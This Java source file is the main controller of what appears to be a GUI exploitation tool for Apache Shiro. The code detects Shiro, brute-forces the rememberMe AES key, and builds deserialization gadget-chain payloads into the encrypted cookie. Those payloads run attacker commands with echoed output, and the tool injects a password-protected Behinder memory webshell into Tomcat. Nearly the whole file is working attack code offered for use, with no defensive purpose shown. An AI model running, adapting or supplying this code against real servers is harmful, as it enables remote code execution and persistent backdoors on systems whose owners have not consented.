package cn.safe6;

import cn.safe6.core.Constants;
import cn.safe6.core.ControllersFactory;
import cn.safe6.core.http.Request;
import cn.safe6.core.http.Response;
import cn.safe6.core.jobs.BurstJob;
import cn.safe6.payload.memshell.BehinderLoader;
import cn.safe6.payload.memshell.BehinderLoader2;
import cn.safe6.payload.memshell.Loader;
import cn.safe6.payload.memshell.Loader1;
import cn.safe6.util.*;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.stage.Window;
import org.apache.commons.io.FileUtils;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.util.EntityUtils;

import javax.servlet.jsp.PageContext;
import java.io.*;
import java.lang.reflect.Method;
import java.net.*;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Controller {

    @FXML
    public Button scan;

    @FXML
    public ChoiceBox method;

    @FXML
    public TextArea postData;

    @FXML
    public Button burstKey;

    @FXML
    public CheckBox gcm;

    @FXML
    public ChoiceBox gadget;

    @FXML
    public ChoiceBox serverType;

    @FXML
    public TextField cmd;

    @FXML
    public Button execCmd;

    @FXML
    public ChoiceBox checkType;

    @FXML
    public TextArea note;
    @FXML
    public TextArea log;

    final private Map<String, Object> paramsContext = ControllersFactory.paramsContext;
    @FXML
    public CheckBox isShowPayload;

    @FXML
    public TextField rememberMe;
    @FXML
    public TextField aesKey;

    @FXML
    public Button inject;

    @FXML
    public TextField shellPasswd;

    @FXML
    public ChoiceBox shellType;
    @FXML
    public TextField path;


    ExecutorService pool = Executors.newFixedThreadPool(8);

    public static LogUtil logUtil;

    @FXML
    private TextField target;


    @FXML
    private MenuItem proxySetupBtn;


    // 设置相关信息保存
    public static Map<String, Object> settingInfo = new HashMap();

    //标识shell有没有注入成功
    private boolean shell =false;


    public void initEvent() {
        method.setOnAction(event -> {
                    if (method.getValue().equals("POST")) {
                        postData.setDisable(false);
                        logUtil.printInfoLog("post可直接使用burp抓到包。如果目标站点是https，请填写对应的URL！", false);
                    }
                    if (method.getValue().equals("GET")) {
                        postData.setDisable(true);
                    }
                }
        );

    }


    // 基本配置信息
    public void basic() {
        //初始化日志
        logUtil = new LogUtil(this.log);

        ControllersFactory.controllers.put(Controller.class.getSimpleName(), this);

        this.log.setText(Constants.BASICINFO);
        this.log.setWrapText(true);

        this.note.setText("可用于临时记录\r\n");
        this.note.setWrapText(true);

        ObservableList<String> methodData = FXCollections.observableArrayList("GET", "POST");
        method.setValue("GET");
        method.setItems(methodData);

        ObservableList<String> checkTypeData = FXCollections.observableArrayList("SimplePrincipalCollection", "dnsLog.cn");
        checkType.setValue("SimplePrincipalCollection");
        checkType.setItems(checkTypeData);

        ObservableList<String> serverTypeData = FXCollections.observableArrayList("Tomcat");
        serverType.setValue("Tomcat");
        serverType.setItems(serverTypeData);

        ObservableList<String> shellTypeData = FXCollections.observableArrayList("BehinderFilter");
        shellType.setValue("BehinderFilter");
        shellType.setItems(shellTypeData);

        ObservableList<String> gadgetData = FXCollections.observableArrayList();
        gadgetData.add("CommonsBeanutils1");
        gadgetData.add("CommonsCollections11");
        gadgetData.add("CommonsCollectionsK1");
        gadgetData.add("CommonsCollectionsK2");
        gadget.setValue("CommonsCollectionsK1");
        gadget.setItems(gadgetData);

    }

    @FXML
    public void startScan() {


        scan.setDisable(true);

        scan.setDisable(false);

    }


    public void initialize() {
        try {
            this.initToolbar();
            this.basic();
            this.initEvent();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }



    @FXML
    public void burstKey(ActionEvent actionEvent) {
        try {
            Platform.runLater(() -> burstKey.setDisable(true));

            this.validAllDataAndSetConfig();
            List<String> keys = this.getShiroKeys();
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");
            Map<String, Object> header = (Map<String, Object>) paramsContext.get("header");
            if (header == null) {
                header = new HashMap<>();
            }
            if (params == null) {
                params = new HashMap<>();
            }

            logUtil.printInfoLog("开始检查目标是否用了shiro", false);
            if (ShiroTool.shiroDetect(url, method, header, params, rmeValue)) {
                logUtil.printSucceedLog("发现shiro特征");
                pool.submit(new BurstJob(url, method, params, keys));
            } else {
                logUtil.printAbortedLog("未发现shiro特征", false);
                logUtil.printInfoLog("停止爆破", true);
                //burstKey.setDisable(false);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            //burstKey.setDisable(false);
            Platform.runLater(() -> burstKey.setDisable(false));
        }


    }

    @FXML
    public void execCmd(ActionEvent actionEvent) throws IOException {
        try {
            Platform.runLater(() -> execCmd.setDisable(true));
            Thread.sleep(50);

            this.validAllDataAndSetConfig();
            String cmd1 = cmd.getText();
            if (cmd1 == null || cmd1.trim().equals("")) {
                Tools.alert("命令错误", "请输入一条命令如whoami");
                return;
            }
            String key = aesKey.getText();
            if (key == null || key.trim().equals("")) {
                Tools.alert("AES密钥错误", "请输入密钥");
                return;
            }


            String expName = gadget.getValue().toString();
            //String echo = serverType.getValue().toString();
            String echo = "TomcatEcho";
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");

            Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
            Class clazz1 = Class.forName(Constants.PAYLOAD_PACK + echo);
            Method mtd = clazz.getMethod("getPayload", byte[].class);

            byte[] payload = (byte[]) mtd.invoke(null, clazz1.getMethod("getPayload").invoke(clazz1));

            System.out.println("payloadLen:"+payload.length);

            Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
            String encryptData;
            if (paramsContext.get("AES").equals(Constants.AES_GCM)) {
                encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, key);
            } else {
                encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
            }
            // = PayloadEncryptTool.AesGcmEncrypt(payload,key);
            String data;

            //请求包header超过8k会报header too large错误
            header.put("cookie", rmeValue + "=" + encryptData);
            header.put("s6", cmd1);
            if (isShowPayload.isSelected()) {
                //System.out.println(""+Controller.logUtil.getLog().getCaretPosition());
                Controller.logUtil.printData(header.toString());
            }

            if (method.equals(Constants.METHOD_GET)) {
                // data = HttpClientUtil.httpGetRequest(url, header);
                data = HttpTool.get(url, header);
            } else {
                data = HttpClientUtil.httpPostRequest(url, header, params);
            }
            if (data != null) {
                if (data.contains("$$")) {
                    logUtil.printData(data.replace("$", ""));
                } else {
                    logUtil.printWarningLog("未获取到回显!", true);
                    logUtil.printData(data);
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            Platform.runLater(() -> execCmd.setDisable(false));
        }

    }


    @FXML
    public void injectShell(ActionEvent actionEvent) {
        try {
            Platform.runLater(() -> inject.setDisable(true));
            Thread.sleep(50);
            this.validAllDataAndSetConfig();

            String key = aesKey.getText();
            if (key == null || key.trim().equals("")) {
                Tools.alert("AES密钥错误", "请输入密钥");
                return;
            }

            String passwd = shellPasswd.getText();
            if (passwd == null || passwd.trim().equals("")) {
                Tools.alert("shell密码错误", "请输入shell密码");
                return;
            }


            String path1 = path.getText();
            if (path1 == null || path1.trim().equals("")) {
                Tools.alert("路径错误", "请输入shell路径");
                return;
            }

            String expName = gadget.getValue().toString();
            String shell = shellType.getValue().toString();
            String url = paramsContext.get("url").toString();
            String method = paramsContext.get("method").toString();
            String rmeValue = paramsContext.get("rmeValue").toString();
            Map<String, Object> params = (Map<String, Object>) paramsContext.get("params");



            //获取class的base64
            //String loaderData = GetByteCodeUtil.getEncodeData(BehinderLoader.class);
            //String loaderData = paramsContext.get("BehinderLoader").toString();
            //String loaderData = Loader.getPayload();
            //System.out.println(loaderData);
            //System.out.println("loaderData:"+loaderData.length());
           //byte[] behinderLoaderBytes = Base64.getDecoder().decode(loaderData);
            //byte[] behinderLoaderBytes = Loader.getPayload();
            byte[] behinderLoaderBytes = Loader1.getPayload();



            //塞进cc链
            Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
            Method mtd = clazz.getMethod("getPayload", byte[].class);
            byte[] payload = (byte[]) mtd.invoke(null, behinderLoaderBytes);

            Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);

            String encryptData;
            if (paramsContext.get("AES").equals(Constants.AES_GCM)) {
                encryptData = PayloadEncryptTool.AesGcmEncrypt(payload, key);
            } else {
                encryptData = PayloadEncryptTool.AesCbcEncrypt(payload, key);
            }

            System.out.println("encryptData:"+encryptData.length());

         /*   if (method.equals(Constants.METHOD_GET)) {
                header.put("Content-Type","application/x-www-form-urlencoded");
            }*/

            //解决长度问题，把大payload放post包提交
            String postData="";
            if (params == null) {
                Class clazz1 = Class.forName(Constants.SHELL_PACK + shell);
                Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class,String.class);
                params = new HashMap<>();
                //冰蝎内存马需要用到pageContext
                //params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
                //反射设置密码，取shell
                String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd,path1));
                //System.out.println(shellData);
                params.put("c1",shellData );
                //postData = "c1="+paramsContext.get("PageContext")+"&c2="+shellData;
            }


            //请求包header超过8k会报header too large错误
            //此处大坑，有时候需要urlencode
            header.put("cookie", rmeValue + "=" + encryptData);

            if (isShowPayload.isSelected()) {
                Controller.logUtil.printData(header.toString());
                Controller.logUtil.printData(params.toString());
            }
            logUtil.printInfoLog("开始注入内存马",true);
            //只能用post进行注入，get参数太长报错400
            String ss= HttpClientUtil.httpPostRequest(url, header, params);
            //String ss =HttpTool.post(url,postData,header);

            //暂时写死
            //url = url+"?test=ok";
            logUtil.printInfoLog("开始检查注入状态",true);
            Response response = HttpTool.get1(url);
            //String data = response.getData();
            String header1 = response.getHeader().toString();
            if (ss.contains("inject success")) {
                logUtil.printSucceedLog("内存马注入成功！");
                logUtil.printSucceedLog("连接地址:  "+url+path1);
                logUtil.printSucceedLog("shell密码:  "+passwd);
            }else {
                logUtil.printAbortedLog("内存马注入失败！",true);
                logUtil.printData(header1);
                //logUtil.printData(data);
                logUtil.printData(ss);
            }

        } catch (Exception e) {
            e.printStackTrace();
            logUtil.printAbortedLog("内存马注入失败！",true);
        } finally {
            Platform.runLater(() -> inject.setDisable(false));
        }

    }


    /**
     * 校验必填,设置config数据
     */
    private void validAllDataAndSetConfig() {
        //logUtil.printInfoLog("检测参数中。。。。。",true);
        String url = this.target.getText().trim();
        if (method.getValue().equals(Constants.METHOD_GET)) {
            if (!Tools.checkTheURL(url)) {
                Tools.alert("URL检查", "URL格式不符合要求，示例：http://127.0.0.1:8080/login");
                return;
            }
            paramsContext.put("url", url);
            paramsContext.put("method", Constants.METHOD_GET);
        } else {
            paramsContext.put("method", Constants.METHOD_POST);
            String requestBody = postData.getText();
            if (requestBody == null || requestBody.trim().equals("")) {
                Tools.alert("HTTP请求不能为空", "请输入一个有效的HTTP请求");
                return;
            }
            Request request = null;
            try {
                request = HttpTool.parseRequest(requestBody);
            } catch (Exception e) {
                // e.printStackTrace();
                Tools.alert("HTTP请求格式错误", "请输入一个有效的HTTP请求");
            }
            if (request != null) {
                paramsContext.put("header", request.getHeader());
                paramsContext.put("params", request.getParams());
                paramsContext.put("paramsStr", request.getParamsStr());
                if (!Tools.checkTheURL(url) && request.getRequestUrl() == null) {
                    Tools.alert("目标错误", "请输入url，或者输入完整的请求包");
                }

                if (Tools.checkTheURL(url)) {
                    request.setRequestUrl(url);
                } else {
                    paramsContext.put("url", request.getRequestUrl());
                }

            } else {
                Tools.alert("HTTP请求格式错误", "请输入一个有效的HTTP请求");
            }

        }
        String rmeValue = rememberMe.getText();
        if (rmeValue == null || rmeValue.trim().equals("")) {
            Tools.alert("shiro特征错误", "请输入一个特征如rememberMe");
            return;
        }

        paramsContext.put("rmeValue", rmeValue);
        paramsContext.put("checkType", checkType.getValue().toString());
        if (gcm.isSelected()) {
            paramsContext.put("AES", Constants.AES_GCM);
        } else {
            paramsContext.put("AES", Constants.AES_CBC);
        }


    }


    /**
     * 获取keys返回
     *
     * @return
     */
    private List<String> getShiroKeys() {

        List<String> list = new ArrayList<>();
        try {
            //优先读取本地配置的key
            File file = new File("shirokeys.txt");
            if (file.exists()) {
                list.addAll(FileUtils.readLines(file, Constants.ENCODING_UTF8));
            }
            //本地不存在，读自带key
            if (list.size() == Constants.LIST_SIZE_ZERO) {
                InputStream inputStream = Controller.class.getClassLoader().getResourceAsStream("ShiroKeys.txt");
                if (inputStream != null) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                    while (reader.ready()) {
                        list.add(reader.readLine());
                    }
                }

            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return list;
    }

    /**
     * 把map参数解析拼接到url后面
     *
     * @param url
     * @param params
     */
    private String parseGetData(String url, Map<String, Object> params) {
        if (url.contains("?")) {
            for (String s : params.keySet()) {
                url = url + "&" + s + "=" + params.get(s).toString();
            }
        } else {
            url = url + "?";
            for (String s : params.keySet()) {
                url = url + s + "=" + params.get(s).toString() + "&";
            }
        }

        return url;
    }


    @FXML
    public void about() {
        Alert alert = new Alert(AlertType.NONE);

        // 点 x 退出
        Window window = alert.getDialogPane().getScene().getWindow();
        window.setOnCloseRequest((e) -> {
            window.hide();
        });

        DialogPane dialogPane = new DialogPane();

        TextArea textArea = new TextArea(Constants.BASICINFO);
        textArea.setEditable(false);
        textArea.setWrapText(true);

        dialogPane.setContent(textArea);


        Image image = new Image(String.valueOf(getClass().getClassLoader().getResource("wx.jpg")));
        ImageView imageView = new ImageView();
        imageView.setImage(image);

        imageView.setFitWidth(200);
        imageView.setPreserveRatio(true);

        dialogPane.setGraphic(imageView);

        ButtonType confirm = new ButtonType("确认");
        dialogPane.getButtonTypes().setAll(confirm);
        alert.setDialogPane(dialogPane);

        alert.showAndWait();


    }

    private void initToolbar() {
        //代理 设置
        this.proxySetupBtn.setOnAction((event) -> {
            Alert inputDialog = new Alert(AlertType.NONE);
            Window window = inputDialog.getDialogPane().getScene().getWindow();
            window.setOnCloseRequest((e) -> {
                window.hide();
            });
            ToggleGroup statusGroup = new ToggleGroup();
            RadioButton enableRadio = new RadioButton("启用");
            RadioButton disableRadio = new RadioButton("禁用");
            enableRadio.setToggleGroup(statusGroup);
            disableRadio.setToggleGroup(statusGroup);
            disableRadio.setSelected(true);
            HBox statusHbox = new HBox();
            statusHbox.setSpacing(10.0D);
            statusHbox.getChildren().add(enableRadio);
            statusHbox.getChildren().add(disableRadio);
            GridPane proxyGridPane = new GridPane();
            proxyGridPane.setVgap(15.0D);
            proxyGridPane.setPadding(new Insets(20.0D, 20.0D, 0.0D, 10.0D));
            Label typeLabel = new Label("类型：");
            ComboBox typeCombo = new ComboBox();
            typeCombo.setItems(FXCollections.observableArrayList(new String[]{"HTTP", "SOCKS"}));
            typeCombo.getSelectionModel().select(0);
            Label IPLabel = new Label("IP地址：");
            TextField IPText = new TextField();
            Label PortLabel = new Label("端口：");
            TextField PortText = new TextField();
            Label userNameLabel = new Label("用户名：");
            TextField userNameText = new TextField();
            Label passwordLabel = new Label("密码：");
            TextField passwordText = new TextField();
            Button cancelBtn = new Button("取消");
            Button saveBtn = new Button("保存");


            try {
                Proxy proxy = (Proxy) settingInfo.get("proxy");

                if (proxy != null) {
                    enableRadio.setSelected(true);

                } else {
                    disableRadio.setSelected(true);
                }

                if (settingInfo.size() > 0) {
                    String type = (String) settingInfo.get("type");
                    if (type.equals("HTTP")) {
                        typeCombo.getSelectionModel().select(0);
                    } else if (type.equals("SOCKS")) {
                        typeCombo.getSelectionModel().select(1);
                    }

                    String ip = (String) settingInfo.get("ip");
                    String port = (String) settingInfo.get("port");
                    IPText.setText(ip);
                    PortText.setText(port);
                    String username = (String) settingInfo.get("username");
                    String password = (String) settingInfo.get("password");
                    userNameText.setText(username);
                    passwordText.setText(password);
                }


            } catch (Exception var28) {
                // this.proxyStatusLabel.setText("代理服务器配置加载失败。");
                this.log.appendText("代理服务器配置加载失败。");
                var28.printStackTrace();
            }


            saveBtn.setOnAction((e) -> {
                if (disableRadio.isSelected()) {
                    this.settingInfo.put("proxy", null);
                    // this.proxyStatusLabel.setText("");
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                } else {

                    final String type;
                    if (!userNameText.getText().trim().equals("")) {
                        final String proxyUser = userNameText.getText().trim();
                        type = passwordText.getText();
                        Authenticator.setDefault(new Authenticator() {
                            public PasswordAuthentication getPasswordAuthentication() {
                                return new PasswordAuthentication(proxyUser, type.toCharArray());
                            }
                        });
                    } else {
                        Authenticator.setDefault(null);
                    }

                    this.settingInfo.put("username", userNameText.getText());
                    this.settingInfo.put("password", passwordText.getText());
                    InetSocketAddress proxyAddr = new InetSocketAddress(IPText.getText(), Integer.parseInt(PortText.getText()));

                    this.settingInfo.put("ip", IPText.getText());
                    this.settingInfo.put("port", PortText.getText());
                    String proxy_type = typeCombo.getValue().toString();
                    settingInfo.put("type", proxy_type);
                    Proxy proxy;
                    if (proxy_type.equals("HTTP")) {
                        proxy = new Proxy(Proxy.Type.HTTP, proxyAddr);
                        this.settingInfo.put("proxy", proxy);
                    } else if (proxy_type.equals("SOCKS")) {
                        proxy = new Proxy(Proxy.Type.SOCKS, proxyAddr);
                        this.settingInfo.put("proxy", proxy);
                    }
                    inputDialog.getDialogPane().getScene().getWindow().hide();
                }
            });

            cancelBtn.setOnAction((e) -> {
                inputDialog.getDialogPane().getScene().getWindow().hide();
            });
            proxyGridPane.add(statusHbox, 1, 0);
            proxyGridPane.add(typeLabel, 0, 1);
            proxyGridPane.add(typeCombo, 1, 1);
            proxyGridPane.add(IPLabel, 0, 2);
            proxyGridPane.add(IPText, 1, 2);
            proxyGridPane.add(PortLabel, 0, 3);
            proxyGridPane.add(PortText, 1, 3);
            proxyGridPane.add(userNameLabel, 0, 4);
            proxyGridPane.add(userNameText, 1, 4);
            proxyGridPane.add(passwordLabel, 0, 5);
            proxyGridPane.add(passwordText, 1, 5);
            HBox buttonBox = new HBox();
            buttonBox.setSpacing(20.0D);
            buttonBox.setAlignment(Pos.CENTER);
            buttonBox.getChildren().add(cancelBtn);
            buttonBox.getChildren().add(saveBtn);
            GridPane.setColumnSpan(buttonBox, 2);
            proxyGridPane.add(buttonBox, 0, 6);
            inputDialog.getDialogPane().setContent(proxyGridPane);
            inputDialog.showAndWait();
        });

    }


}
